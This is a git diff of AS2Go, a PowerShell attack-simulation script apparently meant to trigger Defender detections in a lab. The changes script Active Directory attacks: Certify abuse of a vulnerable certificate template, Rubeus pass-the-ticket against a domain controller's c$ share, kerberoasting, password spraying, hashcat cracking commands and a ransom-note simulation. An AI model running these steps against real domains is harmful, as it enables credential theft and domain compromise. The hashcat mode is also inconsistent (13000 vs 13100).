@@ -20,8 +20,8 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2022-11-19
-File Name  : AS2Go.ps1 | Version 2.5.6
+last update: 2022-11-13
+File Name  : AS2Go.ps1 | Version 2.5.9
 Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
 
@@ -47,11 +47,11 @@ https://herrHoZi.com
 ################################################################################
 
 # 2022-11-19 | v2.5.6 |  Add new color schema for next command
-# 2022-11-13 | v2.5.5 |  Add Attack - Steal or Forge Authentication Certificates
+# 2022-11-13 | v2.5.5 |  Attack - Steal or Forge Authentication Certificates
 # 2022-11-12 | v2.5.4 |  Update Function Get-DirContent
-# 2022-11-08 | v2.5.3 |  Add developer mode switch, add -ScriptBlock {} and region to source code
-# 2022-11-04 | v2.5.2 |  Add Function New-PasswordSprayAttack
-# 2022-10-15 | v2.5.1 |  Add Function Kerberoasting
+# 2022-11-08 | v2.5.3 |  add developer mode switch, add -ScriptBlock {} and region to source code
+# 2022-11-04 | v2.5.2 |  ADD Function New-PasswordSprayAttack
+# 2022-10-15 | v2.5.1 |  ADD Function Kerberoasting
 # 2022-10-13 | v2.1.1 |  Update Function Start-AS2GoDemo | Protected User Error Routine
 # 2022-10-08 | v2.1.0 |  Update Function New-BackDoorUser
 # 2022-09-20 | v2.0.9 |  Update Get-LocalGroupMember -Group "Administrators" | ft
@@ -84,8 +84,9 @@ Param (
 #region Global Settings
 
 [bool]$showStep = $true # show the steps in an image
+[bool]$skipstep = $false # show the steps in an image
 
-$lastupdate = "2022-11-13"
+$lastupdate = "2022-11-19"
 $version = "2.5.9.0" 
 $path = Get-Location
 $scriptName = $MyInvocation.MyCommand.Name
@@ -127,10 +128,14 @@ $global:BDUser = ""
 $global:BDCred = ""
 
 
-
+#Color Schema for the next command
 $fgcS = "DarkGray" # Switch
 $fgcC = "Yellow"   # Command
-$fgcV = "Cyan"     # Value
+$fgcV = "DarkCyan" # Value
+
+
+
+
 
 
 
@@ -219,6 +224,18 @@ function Get-KerberosTGT {
     Write-Log -Message "### Start Function $myfunction ###"
     ################## main code | out- host #####################
     
+    Clear-Host
+    Write-Host "____________________________________________________________________`n" 
+    Write-Host "            FIRST try to connect to a DC c$ share            "
+    Write-Host "____________________________________________________________________`n" 
+    
+    $directory = "\\$myDC\c$"
+    Get-DirContent -Path $directory
+    pause
+    Clear-Host
+    Write-Host "____________________________________________________________________`n" 
+    Write-Host "                    Get-KerberosTGT            "
+    Write-Host "____________________________________________________________________`n" 
     #regionword = Read-Host "Enter password for pfx file - $pfxFile"
     $request = ".\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt"
     
@@ -230,24 +247,23 @@ function Get-KerberosTGT {
     Write-Log -Message $request
 
     pause
-
-    $directory = "\\$myDC\c$"
-    Get-DirContent -Path $directory
-    pause
-
     #Invoke-Command -ScriptBlock {.\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt} | Out-Host
-    Invoke-Command -ScriptBlock { .\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt } | out-host
+    #Invoke-Command -ScriptBlock { .\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt } | Out-Host
+    .\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt | Out-Host
 
     pause
 
-    Write-host "Try to access the c$ of a Domain Controller`n" -ForegroundColor Yellow
+    Write-Host "____________________________________________________________________`n" 
+    Write-Host "            Now try again to connect to a DC c$ share            "
+    Write-Host "____________________________________________________________________`n" 
+    
     $directory = "\\$myDC\c$"
     Get-DirContent -Path $directory
-
-
-    #$passdirectory = "\\$myDC\c$"
-    Get-DirContent -Path $directory
     pause
+    Clear-Host
+
+
+ 
 
     klist
     pause
@@ -282,9 +298,9 @@ function Start-ConvertingToPfxFromPem {
 
     # example: openssl pkcs12 -in $pemFile -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out $pfxFile
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text "openssl ","pkcs12 -in ", $pemFile, " -keyex -CSP ", """Microsoft Enhanced Cryptographic Provider v1.0""", " -export -out ",$pfxFile ` 
-                    -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
-
+    Write-Highlight -Text "openssl ","pkcs12 -in ", $pemFile, " -keyex -CSP ", """Microsoft Enhanced Cryptographic Provider v1.0""", " -export -out ",$pfxFile `
+                        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
+    Write-Host ""
     pause
 
     try {
@@ -293,17 +309,31 @@ function Start-ConvertingToPfxFromPem {
     catch {
         Write-Output $convert  | clip
     }
-
+ 
     $StartOpenSSL = Get-KeyValue -key "OpenSSL"
+    #Invoke-Item $StartOpenSSL | Out-Host
+    Start-Process -filePath $StartOpenSSL
+    
+    Write-Host "Next steps:" -ForegroundColor Yellow
+    Write-Host "---------- " -ForegroundColor Yellow
+    Write-Host " - Change to console "  -NoNewline; Write-Host "Win64 OpenSSL Command Prompt" -ForegroundColor Yellow
+    Write-Host " - Change directory to C:\temp\AS2GO"
+    Write-Host " - Paste the command into the OpenSSL Command Prompt"
+    Write-Host " - Save the pfx file with " -NoNewline
+    Write-Host "NO " -NoNewline  -ForegroundColor Yellow; Write-Host "password"
+    Write-Host " - Change back to console " -NoNewline; Write-Host $stage25 -ForegroundColor Yellow
+    Write-Host ""
 
-    Invoke-Item $StartOpenSSL | Out-Host
-    Start-Sleep -Milliseconds 800
+    Start-Sleep -Milliseconds 1500
+    Get-Process -name cmd | Format-Table name, id, mainWindowTitle | Out-Host
     pause
 
     write-host "Saved to file:" -ForegroundColor Yellow
     Get-Item $pfxFile | Out-Host
-    pause
-
+    
+    #stop 
+    $ProcessObject =Get-Process -name cmd | Where-Object {$_.mainWindowTitle -eq ""}
+    Stop-Process -InputObject $ProcessObject
 
     Write-Log -Message "    >> using $PfxFile"
     #endregion ####################### main code #########################
@@ -330,51 +360,51 @@ function Start-RequestingCertificate {
 
     $pemFile = "$altname.pem".ToLower()
 
-# example: openssl pkcs12 -in $pemFile -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out $pfxFile
-Write-Host      -NoNewline "  Command: "
-Write-Highlight -Text ".\certify.exe ", "request /ca:", $myEntCA, " /template:", $CAtemplate, " /altname:",$altname `
-                -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
-Write-Host ""
-
+    # example:  Command: .\certify.exe request /ca:NUC-DC01.SANDBOX.CORP\AS2GO-CA /template:AS2Go /altname:DA-HERRHOZI
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text ".\certify.exe ", "request /ca:", $myEntCA, " /template:", $CAtemplate, " /altname:",$altname `
+                    -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
+    Write-Host ""
     Write-Log -Message "     >> .\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname"
-    pause
 
+    $question = "`nDo you want to run this step - Y or N? Default "
+    $answer = Get-Answer -question $question -defaultValue $yes
 
-    $text = "Copy the certificate content printed out by certify and paste it into this file!"
+    If ($answer -eq $yes) {
 
-    if (!(Test-Path $pemFile)) {
-        New-Item -path . -name $pemFile -type "file" -value $text
-    }
-    else {
+        $text = "Copy the certificate content printed out by certify and paste it into this file!"
+
+        if (!(Test-Path $pemFile)) {
+            New-Item -path . -name $pemFile -type "file" -value $text
+        }
+        else {
         Set-Content -path $pemFile -value $text
+        }
+
+        # more content to this file
+        Add-Content -path .\$pemFile -value "Save this file"
+        Add-Content -path .\$pemFile -value "Please remove these lines before!"
+
+        #Check connection to Enterprise CA
+        $result = certutil -config $myEntCA -ping
+
+        #Request a Certificates
+        If ($result[2].ToLower().Contains("successfully") -eq $True) {
+            Invoke-Command -ScriptBlock { .\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname } | Out-host
+            Invoke-Command -ScriptBlock { notepad .\$pemFile } | Out-host
+            Write-Log -Message "The certificate retrieved is in a PEM format - $pemFile" 
+        }
+        else {
+            Write-Host $result[1] -ForegroundColor red
+            Write-Host $result[3]
+            Write-Host $result[4]
+        }
+        pause
     }
-
-    # more content to this file
-    Add-Content -path .\$pemFile -value "Save this file"
-    Add-Content -path .\$pemFile -value "Please remove these lines before!"
-
-
-    #Check connection to Enterprise CA
-    $result = certutil -config $myEntCA -ping
-
-    #Request a Certificates
-    If ($result[2].ToLower().Contains("successfully") -eq $True) {
-        Invoke-Command -ScriptBlock { .\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname } | Out-host
-        Invoke-Command -ScriptBlock { notepad .\$pemFile } | Out-host
-        Write-Log -Message "The certificate retrieved is in a PEM format - $pemFile" 
-    }
-    else {
-        Write-Host $result[1] -ForegroundColor red
-        Write-Host $result[3]
-        Write-Host $result[4]
-    }
-    pause
-
+ 
     write-host "Saved to file:" -ForegroundColor Yellow
     Get-Item $pemFile | Out-Host
-
     pause
-
 
     Write-Log -Message "    >> using $pemFile"
     #endregion ####################### main code #########################
@@ -401,13 +431,15 @@ function Get-VulnerableCertificateTemplate {
                     -Color $fgcC, $fgcS
     Write-Host ""
     Write-log -Message "     .\certify.exe find /vulnerable"
-    pause
+    
+    $question = "`nDo you want to run this step - Y or N? Default "
+    $answer = Get-Answer -question $question -defaultValue $no
 
-    #find vulnerable CA templates
-    Invoke-Command -ScriptBlock { .\certify.exe find /vulnerable } | Out-Host
-
-
-    Write-Host "`nFound Vulnerable Certificate Templates - $CAtemplate" -ForegroundColor Yellow
+    If ($answer -eq $yes) {
+        #find vulnerable CA templates
+        Invoke-Command -ScriptBlock { .\certify.exe find /vulnerable } | Out-Host
+        Write-Host "`nFound Vulnerable Certificate Templates - $CAtemplate" -ForegroundColor Yellow
+    }
 
     Do {
         $question = "`nDo you want to use CA template '$CAtemplate' - Y or N? Default "
@@ -486,6 +518,7 @@ function Start-KerberoastingAttack {
     $myDomain = $env:USERDNSDOMAIN
     $hashes = "$myDomain.hashes.txt"
 
+
     # example: .\Rubeus.exe kerberoast /domain:SANDBOX.CORP /outfile:.\SANDBOX.CORP.hashes.txt
     Write-Host      -NoNewline "  Command: "
     Write-Highlight -Text ".\Rubeus.exe ", "kerberoast /domain:", $myDomain, " /outfile:.\", $hashes `
@@ -497,20 +530,25 @@ function Start-KerberoastingAttack {
     $answer = Get-Answer -question $question -defaultValue $No
 
     If ($answer -eq $yes) {   
-
-        Invoke-Command -ScriptBlock { .\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes }
+        if (Test-Path $hashes) {Remove-Item $hashes}
+        Invoke-Command -ScriptBlock {.\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes}
         Invoke-Item .\$hashes
     
         pause
+        #https://medium.com/geekculture/hashcat-cheat-sheet-511ce5dd7857
         Write-Host "`n"
-        write-host "The next step is cracking the roasted hashes. HASHCAT is good tool." -ForegroundColor Yellow
-        Write-Host "`nThe cracking mode for TGS-REP hashes is 13100, e.g.`n"
-        Write-host "hashcat.exe -a 3 -m 13100 ./$hashes -1 123  -2 eqw ?1?2?1?2?1?2?s?u" -ForegroundColor Yellow
-  
+        write-host "The next step is " -NoNewline; write-host "cracking" -NoNewline -ForegroundColor Yellow 
+        Write-host " the roasted hashes. HASHCAT is a good tool." 
+        Write-host "Let’s use the example where you know the password policy for the password; known as Brute-force or mask attack."
+        Write-Host "The cracking mode for TGS-REP hashes is 13100.`n"
+        
+        # example: .\hashcat.exe -a 3 -m 13000 ./SANDBOX.CORP.hashes.txt ?u?l?l?l?l?l?d?d
+        Write-Host      -NoNewline "  Example: "
+        Write-Highlight -Text ".\hashcat.exe ", "-a ","3"," -m ", "13000 ", "./$hashes ", "?u?l?l?l?l?l?d?d" `
+                        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcV, $fgcV
+        Write-Host "`n"
         pause
-
     }
-
 
     #####
     Write-Log -Message "### End Function $myfunction ###"
@@ -612,9 +650,6 @@ function New-PasswordSprayAttack {
         Write-Host " with Password: " -NoNewline; Write-Host $MyPW01 -ForegroundColor Yellow
     }
 
-
-
-
     $question = "`nDo you also want to run a Password Spray attack with rubues.exe - Y or N? Default "
     $prompt = Get-Answer -question $question -defaultValue $no
 
@@ -625,9 +660,13 @@ function New-PasswordSprayAttack {
         if ($prompt -ne $yes) {
             $MyPW03 = Read-Host "Enter new password"
         }
+        Write-Host ""
+        Write-Host      -NoNewline "  Command: "
+        Write-Highlight -Text " .\Rubeus.exe ", "brute /password:", $MyPW03, " /noticket" `
+                        -Color $fgcC, $fgcS, $fgcV, $fgcS
+        Write-Host ""
 
         Write-Log -Message ".\Rubeus.exe brute /password:$MyPW03 /noticket"
-        Write-Host  ".\Rubeus.exe brute /password:$MyPW03 /noticket"
         pause
         Invoke-Command -ScriptBlock { .\Rubeus.exe brute /password:$MyPW03 /noticket }
     }
@@ -728,7 +767,7 @@ function SimulateRansomare {
 
     # create info for the victim
     $newFile = "$path\$filePrefix.txt"
-(Get-Date).toString("yyyy:MM:dd HH:mm:ss") + "  | Hi $env:USERNAME, by the next time, I'll encrypt also your Active Dictory Backup files."  | Out-File -FilePath $newFile 
+    (Get-Date).toString("yyyy:MM:dd HH:mm:ss") + "  | Hi $env:USERNAME, by the next time, I'll encrypt also your Active Dictory Backup files."  | Out-File -FilePath $newFile 
     Get-Item $FolderToEncrypt\*.* | Out-File -FilePath $newFile -Append
     Copy-Item -Path ".\$filePrefix.txt" -Destination $FolderToEncrypt -Recurse
     Invoke-Item "$FolderToEncrypt\$filePrefix.txt"
@@ -1553,7 +1592,7 @@ function Get-AS2GoSettings {
 
     Do {
 
-
+     
         #read values from the system
         $DomainName = (Get-ADDomain).DNSRoot
         $DomainSID = (Get-ADDomain).DomainSID.Value
@@ -1583,11 +1622,6 @@ function Get-AS2GoSettings {
         $OfflineDITFile = Get-KeyValue -key "OfflineDITFile"
         $myAppServer = Get-KeyValue -key "myAppServer"
         $honeytoken = Get-KeyValue -key  "honeytoken"
-
-
-
-
-
 
         # fill the arrays
         $MyParameter = @("Logon Server / DC         ", `
@@ -1649,7 +1683,6 @@ function Get-AS2GoSettings {
         # list the current values
         for ($counter = 0; $counter -lt $MyParameter.Length; $counter++ ) {
     
-    
             write-host ([string]$counter).PadLeft(4, ' ') ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter)
             #write-host $counter ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter) # -ForegroundColor Yellow
         }
@@ -1683,6 +1716,8 @@ function Get-AS2GoSettings {
         # End "Do ... Until" Loop?
         $question = "`nDo you need to update more settings - Y or N? Default "
         $repeat = Get-Answer -question $question -defaultValue $no
+
+        If ($skipstep) { break }   
    
     } Until ($repeat -eq $no)
 
@@ -2114,7 +2149,7 @@ function Start-Reconnaissance-Part1 {
     Write-Host "____________________________________________________________________`n`n" 
   
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text "Get-ADGroupMember ", "-Identity ", $GroupDA, " -Recursive |"," Format-Table" `
+    Write-Highlight -Text "Get-ADGroupMember ", "-Identity """, $GroupDA, """ -Recursive |"," Format-Table" `
                 -Color    $fgcC,                   $fgcS, $fgcV, $fgcS,$fgcC  
 
     
@@ -2128,7 +2163,7 @@ function Start-Reconnaissance-Part1 {
 
     
     Write-Host -NoNewline "  Command: "
-    Write-Highlight -Text ("Get-ADComputer ","-Filter * | ", "ft "," Name, Enabled, DistinguishedName") -Color $fgcC, $fgcS, $fgcC, $fgcV
+    Write-Highlight -Text ("Get-ADComputer ","-Filter * | ", "Format-Table"," Name, Enabled, OperatingSystem, DistinguishedName") -Color $fgcC, $fgcS, $fgcC, $fgcV
     #Write-Host "Get-ADComputer -Filter * | ft Name, Enabled, DistinguishedName" -ForegroundColor $global:FGCCommand
     Write-Host ""
 
@@ -2447,8 +2482,9 @@ Function Start-AS2GoDemo {
         If ($DeveloperMode) {
   
             [bool]$showStep = $false
-            Write-Host ""
-            Write-Warning "    Running AS2Go in Developer Mode!"
+            [bool]$skipstep =$True
+            Write-Host  -ForegroundColor DarkRed "`n                    FYI: Running AS2Go inDeveloper Mode"
+            #Write-Warning "    Running AS2Go in Developer Mode!"
             Write-Host ""
             Write-Log -Message "Running AS2Go inDeveloper Mode"
         }
@@ -2481,6 +2517,8 @@ Function Start-AS2GoDemo {
         If ($showStep) { Show-Step -step "step_004.html" }
 
         Do {
+            If ($skipstep) { break }            
+            
             Clear-Host
             Write-Host "____________________________________________________________________`n" 
             Write-Host "                   Attack Level - Bruce Force Account                    "
@@ -2551,6 +2589,7 @@ Function Start-AS2GoDemo {
         If ($DeveloperMode) {
   
             [bool]$showStep = $false
+            [bool]$skipstep =$True
             Write-Host ""
             Write-Warning "    Running AS2Go in Developer Mode!`n"
             Write-Log -Message "Running AS2Go inDeveloper Mode"
@@ -2691,7 +2730,14 @@ Function Start-AS2GoDemo {
   
 
         $question = "`nDo you want to run this step - Y or N? Default "
-        $answer = Get-Answer -question $question -defaultValue $Yes
+        If ($skipstep) 
+        {
+            $answer = Get-Answer -question $question -defaultValue $No
+        }
+        else {
+            $answer = Get-Answer -question $question -defaultValue $Yes
+        }
+
 
         If ($answer -eq $yes) {
             Write-Host "`n`n"
@@ -2738,10 +2784,13 @@ Function Start-AS2GoDemo {
         else {
         }
 
+        If ($skipstep) {break}
 
         Write-Host "____________________________________________________________________`n" 
         Write-Host "      ??? REPEAT | Attack Level - COMPROMISED User Account ???      "
         Write-Host "____________________________________________________________________`n" 
+
+       
 
         # End "Do ... Until" Loop?
         $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
@@ -2763,6 +2812,7 @@ Function Start-AS2GoDemo {
     #Set-KeyValue -key "LastStage" -NewValue $stage10
     If ($showStep) { Show-Step -step "step_006.html" }
     Do {
+        If ($skipstep) { break }     
         Clear-Host
         Write-Host "____________________________________________________________________`n" 
         Write-Host "                   Attack Level - RECONNAISSANCE                    "
@@ -2818,6 +2868,7 @@ Function Start-AS2GoDemo {
     Set-KeyValue -key "LastStage" -NewValue $stage20
     If ($showStep) { Show-Step -step "step_007.html" }
     Do {
+        If ($skipstep) { break }     
         Clear-Host
         Write-Host "____________________________________________________________________`n" 
         Write-Host "                 Attack Level - LATERAL MOVEMENT                    "
@@ -2892,9 +2943,7 @@ Function Start-AS2GoDemo {
 
             $altname = $domainadmin
             $pemFile = ".\$altname.pem"
-            $pfxFile = ".\$altname.pfx"
-
-     
+            $pfxFile = ".\$altname.pfx"   
    
 
 
@@ -2941,8 +2990,6 @@ Function Start-AS2GoDemo {
                 Write-Host "      Step 3 - Requesting Certificate with Certify                           "
                 Write-Host "____________________________________________________________________`n"
 
-
-
                 $pemFile = Start-RequestingCertificate -myEntCA $EnterpriseCA -CAtemplate $CAtemplate -altname $domainadmin
 
                 $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
@@ -2973,12 +3020,8 @@ Function Start-AS2GoDemo {
                 Write-Host "      Step 5 - Request a Kerberos TGT "
                 Write-Host "               for the user for which we minted the new certificate                  "
                 Write-Host "____________________________________________________________________`n"
-                $today = "2022-11-16"
 
-
-
-                $mydebug = Get-KerberosTGT -pfxFile $pfxFile -altname $domainadmin
-
+                Get-KerberosTGT -pfxFile $pfxFile -altname $domainadmin
 
                 $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
                 $repeat = Get-Answer -question $question -defaultValue $no
